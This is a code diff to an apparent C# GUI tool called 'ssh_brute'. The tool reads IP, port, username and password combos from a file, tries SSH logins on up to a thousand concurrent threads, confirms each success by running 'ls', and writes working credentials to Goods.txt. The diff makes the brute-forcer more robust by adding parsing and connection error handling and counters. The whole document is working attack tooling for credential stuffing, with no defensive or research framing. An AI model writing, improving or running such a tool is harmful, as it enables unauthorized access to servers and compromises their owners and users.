@@ -23,7 +23,8 @@ namespace ssh_brute
         public static Thread thread0_start;
         public static Thread thread1_start;
         public static Thread thread2_start;
-
+        public static int error_string = 0;
+        public static int error_connection = 0;
         public static int goods = 0;
         public static int bads = 0;
 
@@ -118,67 +119,93 @@ namespace ssh_brute
 
         public void authorize(string combos_line, string thread_name)
         {
-            string ip = combos_line.Split('|')[0].Split(':')[0];
-            int port = int.Parse(combos_line.Split('|')[0].Split(':')[1]);
-            string username = combos_line.Split('|')[1].Split(':')[0];
-            string password = combos_line.Split('|')[1].Split(':')[1];
-            PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, username, password);
-            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {username} | {password}")));
-            connectionInfo.Timeout = TimeSpan.FromSeconds(30);
-            using (var client = new SshClient(connectionInfo))
+            string ip = "";
+            int port = 0;
+            string username = "";
+            string password = "";
+            try
             {
-                try
+                ip = combos_line.Split('|')[0].Split(':')[0];
+                port = int.Parse(combos_line.Split('|')[0].Split(':')[1]);
+                username = combos_line.Split('|')[1].Split(':')[0];
+                password = combos_line.Split('|')[1].Split(':')[1];
+            }
+            catch { error_string++; label7.Invoke((MethodInvoker)(() => label7.Text = $"String Error: {error_string}")); }
+            try
+            {
+                if (ip == String.Empty && port == 0 && username == "" && password == "") { }
+                else
                 {
-                    client.Connect();
-                    if (client.IsConnected)
+                    PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, username, password);
+                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {username} | {password}")));
+                    connectionInfo.Timeout = TimeSpan.FromSeconds(30);
+                    using (var client = new SshClient(connectionInfo))
                     {
-                        client.RunCommand("ls");
-                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {combos_line}")));
-                        goods++;
-                        label4.Invoke((MethodInvoker)(() => label4.Text = $"Goods: {goods}"));
-                        using (StreamWriter sw = new StreamWriter("Goods.txt"))
+                        try
                         {
-                            sw.WriteLine(combos_line);
+                            client.Connect();
+                            if (client.IsConnected)
+                            {
+                                client.RunCommand("ls");
+                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {combos_line}")));
+                                goods++;
+                                label4.Invoke((MethodInvoker)(() => label4.Text = $"Goods: {goods}"));
+                                using (StreamWriter sw = new StreamWriter("Goods.txt"))
+                                {
+                                    sw.WriteLine(combos_line);
+                                }
+                            }
+                            else
+                            {
+                                bads++;
+                                label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
+                            }
                         }
-                    }
-                    else 
-                    {
-                        bads++;
-                        label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
+                        catch { }
                     }
                 }
-                catch { }
-            }
+            } catch { error_connection++; label8.Invoke((MethodInvoker)(() => label8.Text = $"Connection Error: {error_connection}")); }
+            
             threads.Remove(thread_name);
         }
 
 
         public void bruteforcing()
         {
-            var combos_lines = File.ReadAllLines(_combos);
-            for (int i = 0; i<File.ReadAllLines(_combos).Length; i++)
+            try
             {
-                while (true)
+                var combos_lines = File.ReadAllLines(_combos);
+                for (int i = 0; i < File.ReadAllLines(_combos).Length; i++)
                 {
-                    label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
-                    if (threads.Count >= 1000) { Thread.Sleep(10); }
-                    else
+                    try
                     {
-                        string thread_name = $"Thread-{i}";
-                        threads.Add(thread_name);
-                        thread2_start = new Thread(() => authorize(File.ReadAllLines(_combos)[i], thread_name));
-                        thread2_start.Start();
-                        Thread.Sleep(50);
-                        break;
+                        while (true)
+                        {
+                            label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
+                            if (threads.Count >= 1000) { Thread.Sleep(10); }
+                            else
+                            {
+                                string thread_name = $"Thread-{i}";
+                                threads.Add(thread_name);
+                                thread2_start = new Thread(() => authorize(File.ReadAllLines(_combos)[i], thread_name));
+                                thread2_start.Start();
+                                Thread.Sleep(50);
+                                break;
+                            }
+                        }
                     }
+                    catch { }
                 }
             }
+            catch { }
         }
 
         private void button6_Click(object sender, EventArgs e)
         {
             goods = 0;
             bads = 0;
+            error_string = 0;
+            error_connection = 0;
             thread1_start = new Thread(bruteforcing);
             thread1_start.Start();
         }
